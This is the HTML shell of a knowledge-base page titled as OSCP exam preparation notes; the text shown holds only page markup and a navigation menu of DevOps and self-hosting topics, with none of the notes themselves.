
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Rafa Madolell">
      
      
      
        <link rel="prev" href="../../Prometheus%20Grafana/Grafana/">
      
      
        <link rel="next" href="../../SSL/SSLInstallCert/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.21">
    
    
      
        <title>Preparación para el OSCP (by s4vitar) - Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.66ac8b77.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#preparacion-para-el-oscp-by-s4vitar" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Knowledge Base" class="md-header__button md-logo" aria-label="Knowledge Base" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Knowledge Base
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Preparación para el OSCP (by s4vitar)
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Knowledge Base" class="md-nav__button md-logo" aria-label="Knowledge Base" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome to Insanerask KB
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../WinActivate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WinActivate
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    AWS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            AWS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Gitlab runner autoscaling aws asg
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            Gitlab runner autoscaling aws asg
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GitLab HA Scaling Runner Vending Machine for AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Changelog
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Branch Testing Before Merging to Main
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Features of GitLab HA Scaling Runner Vending Machine for AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Testing and Troubleshooting Guide
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/easybuttons/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GitLab HA Scaling Runner Vending Machine for AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_7" >
        
          
          <label class="md-nav__link" for="__nav_3_1_7" id="__nav_3_1_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Ec2 image builder
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_7">
            <span class="md-nav__icon md-icon"></span>
            Ec2 image builder
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Ansible
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Ansible
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-02-commands/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible-02
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-03-playbook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible Playbooks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-04-config-files/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible - Configuration Files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-05-Handlers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible Handlers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-06-Variables/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible 06 Variables
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-07-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible Notes (NO)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/Ansible-08-sshkey/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Specifying ssh key in ansible playbook file
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible/install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How To Install and Configure Ansible on Ubuntu 22.04
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Ansible Semaphore
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Ansible Semaphore
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ansible Semaphore
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/CODE_OF_CONDUCT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Contributor Covenant Code of Conduct
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/CONTRIBUTING/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pull Requests
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4" >
        
          
          <label class="md-nav__link" for="__nav_5_4" id="__nav_5_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Deployment
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_4">
            <span class="md-nav__icon md-icon"></span>
            Deployment
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4_1" >
        
          
          <label class="md-nav__link" for="__nav_5_4_1" id="__nav_5_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Docker
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_4_1">
            <span class="md-nav__icon md-icon"></span>
            Docker
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/deployment/docker/Readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker Deployments
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4_1_2" >
        
          
          <label class="md-nav__link" for="__nav_5_4_1_2" id="__nav_5_4_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Common
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_4_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_4_1_2">
            <span class="md-nav__icon md-icon"></span>
            Common
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/deployment/docker/common/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    semaphore-wrapper
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4_2" >
        
          
          <label class="md-nav__link" for="__nav_5_4_2" id="__nav_5_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Systemd
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_4_2">
            <span class="md-nav__icon md-icon"></span>
            Systemd
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/deployment/systemd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Systemd
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_5" >
        
          
          <label class="md-nav__link" for="__nav_5_5" id="__nav_5_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Web
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_5">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Ansible%20Semaphore/web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    web
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Apuntes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Apuntes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
        
          
          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Apuntes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_1">
            <span class="md-nav__icon md-icon"></span>
            Apuntes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Apuntes/apuntes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Apuntes/apuntes/LICENSE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LICENSE
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Authentik
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Authentik
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Authentik/ExternalDoc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    authentik: Authentication, SSO, User Management &amp; Password Reset for Home Networks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Authentik/authetikDoc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker Compose installation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Authentik/docker-compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker compose
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Azure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Azure/Git%20Codes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Git Codes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Bitwarden
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Bitwarden
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Bitwarden/Install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Bitwarden/Vaultwarden/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Instalación de Vaultwarden en Docker
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Caddy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Caddy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Caddy/caddyDoc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    caddyDoc
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Cubic
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            Cubic
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Cubic/Cubic/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Custom Distribution Docs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
        
          
          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Dockers
  </span>
  

